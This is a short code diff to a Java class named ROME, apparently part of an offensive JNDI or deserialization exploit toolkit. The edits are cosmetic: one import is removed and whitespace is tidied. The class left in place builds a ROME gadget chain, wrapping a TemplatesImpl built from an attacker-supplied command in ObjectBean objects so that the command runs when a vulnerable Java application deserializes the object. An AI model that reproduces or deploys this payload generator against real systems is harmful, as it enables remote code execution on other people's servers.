@@ -1,13 +1,11 @@
 package com.qi4l.jndi.gadgets;
 
-import com.qi4l.jndi.enumtypes.PayloadType;
 import com.qi4l.jndi.gadgets.annotation.Authors;
 import com.qi4l.jndi.gadgets.annotation.Dependencies;
 import com.qi4l.jndi.gadgets.utils.Gadgets;
 import com.sun.syndication.feed.impl.ObjectBean;
 
 import javax.xml.transform.Templates;
-
 
 
 /**
@@ -34,8 +32,8 @@ public class ROME implements ObjectPayload<Object> {
     public Object getObject(String command) throws Exception {
         final Object templates;
         templates = Gadgets.createTemplatesImpl(command);
-        ObjectBean            delegate = new ObjectBean(Templates.class, templates);
-        ObjectBean            root     = new ObjectBean(ObjectBean.class, delegate);
+        ObjectBean delegate = new ObjectBean(Templates.class, templates);
+        ObjectBean root     = new ObjectBean(ObjectBean.class, delegate);
         return Gadgets.makeMap(root, root);
     }
 }
